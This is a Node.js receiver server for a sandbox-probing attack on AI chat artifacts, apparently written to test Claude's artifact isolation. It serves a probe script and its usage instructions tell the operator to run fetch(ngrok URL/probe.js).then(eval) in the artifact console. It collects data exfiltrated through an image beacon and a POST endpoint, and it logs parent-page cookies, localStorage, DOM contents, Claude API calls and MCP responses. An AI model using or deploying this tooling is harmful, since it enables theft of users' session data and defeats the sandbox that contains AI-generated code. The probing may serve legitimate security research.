// Simple receiver server - run with: node server.js
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 80;

const server = http.createServer((req, res) => {
  // CORS headers for cross-origin requests from artifact
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Serve pwned.html
  if (req.method === 'GET' && req.url === '/pwned.html') {
    const html = fs.readFileSync(path.join(__dirname, 'pwned.html'), 'utf-8');
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'no-store');
    res.writeHead(200);
    res.end(html);
    console.log(`[${new Date().toISOString()}] Served pwned.html`);
    return;
  }

  // Serve index.html
  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
    const html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf-8');
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.writeHead(200);
    res.end(html);
    console.log(`[${new Date().toISOString()}] Served index.html`);
    return;
  }

  // Serve probe.js for ANY .js request (Claude may rename the script)
  if (req.method === 'GET' && req.url.endsWith('.js')) {
    const js = fs.readFileSync(path.join(__dirname, 'probe.js'), 'utf-8');
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'no-store');
    res.writeHead(200);
    res.end(js);
    console.log(`[${new Date().toISOString()}] Served probe.js (requested as ${req.url})`);
    return;
  }

  // Receive results via image beacon (GET with query params)
  if (req.method === 'GET' && req.url.startsWith('/report?')) {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    const chunk = url.searchParams.get('chunk');
    const total = url.searchParams.get('total');
    const data = url.searchParams.get('d');

    console.log(`[${new Date().toISOString()}] Beacon chunk ${chunk}/${total}, size: ${data?.length || 0}`);

    // Store chunks
    const chunkDir = path.join(__dirname, 'chunks');
    if (!fs.existsSync(chunkDir)) fs.mkdirSync(chunkDir);
    fs.writeFileSync(path.join(chunkDir, `chunk-${chunk}.txt`), decodeURIComponent(data || ''));

    // If last chunk, reassemble
    if (parseInt(chunk) === parseInt(total) - 1) {
      let full = '';
      for (let i = 0; i < parseInt(total); i++) {
        const p = path.join(chunkDir, `chunk-${i}.txt`);
        if (fs.existsSync(p)) full += fs.readFileSync(p, 'utf-8');
      }
      try {
        const parsed = JSON.parse(full);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        fs.writeFileSync(path.join(__dirname, `results-${timestamp}.json`), JSON.stringify(parsed, null, 2));
        console.log(`\n${'='.repeat(60)}`);
        console.log(`BEACON RESULTS REASSEMBLED - ${full.length} bytes`);
        console.log(`${'='.repeat(60)}\n`);
      } catch(e) {
        console.log('Failed to parse reassembled beacon data');
      }
    }

    // Return 1x1 transparent PNG
    const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQABNjN9GQAAAABJRElEQkSuQmCC', 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.writeHead(200);
    res.end(pixel);
    return;
  }

  // Receive results via POST
  if (req.method === 'POST' && req.url === '/report') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const filename = `results-${timestamp}.json`;
      const filepath = path.join(__dirname, filename);

      // Pretty print to file
      try {
        const parsed = JSON.parse(body);
        fs.writeFileSync(filepath, JSON.stringify(parsed, null, 2));
        console.log(`\n${'='.repeat(60)}`);
        console.log(`[${new Date().toISOString()}] RESULTS RECEIVED`);
        console.log(`Saved to: ${filepath}`);
        console.log(`${'='.repeat(60)}`);

        // Print summary
        const r = parsed;
        console.log('\n--- SUMMARY ---');
        console.log('Origin:', r.context?.origin);
        console.log('Iframe depth:', r.context?.iframeDepth);
        console.log('Parent URL:', r.parentAccess?.url || 'BLOCKED');
        console.log('Parent DOM length:', r.parentAccess?.htmlLength || 'BLOCKED');
        console.log('Parent writable:', r.parentWritable);
        console.log('Parent localStorage:', JSON.stringify(r.parentLocalStorage));
        console.log('Parent cookies:', r.parentCookies);
        console.log('Parent fetch status:', r.parentFetch?.status || 'BLOCKED');
        console.log('Claude API from parent:', r.claudeApiFromParent?.status || r.claudeApiFromParent?.error || 'BLOCKED');
        console.log('MCP responses:', r.mcpResponses?.length || 0);
        console.log('Parent scripts:', r.parentScripts?.length || 'BLOCKED');
        console.log('---\n');
      } catch(e) {
        fs.writeFileSync(filepath, body);
        console.log('Saved raw (parse failed):', filepath);
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log(`\nSandbox probe server running on http://localhost:${PORT}`);
  console.log(`\nTo use:`);
  console.log(`1. Expose this with ngrok: ngrok http ${PORT}`);
  console.log(`2. Update REPORT_URL in probe.js with your ngrok URL + /report`);
  console.log(`3. In artifact console, run:`);
  console.log(`   fetch('YOUR_NGROK_URL/probe.js').then(r=>r.text()).then(eval)`);
  console.log(`\nWaiting for results...\n`);
});
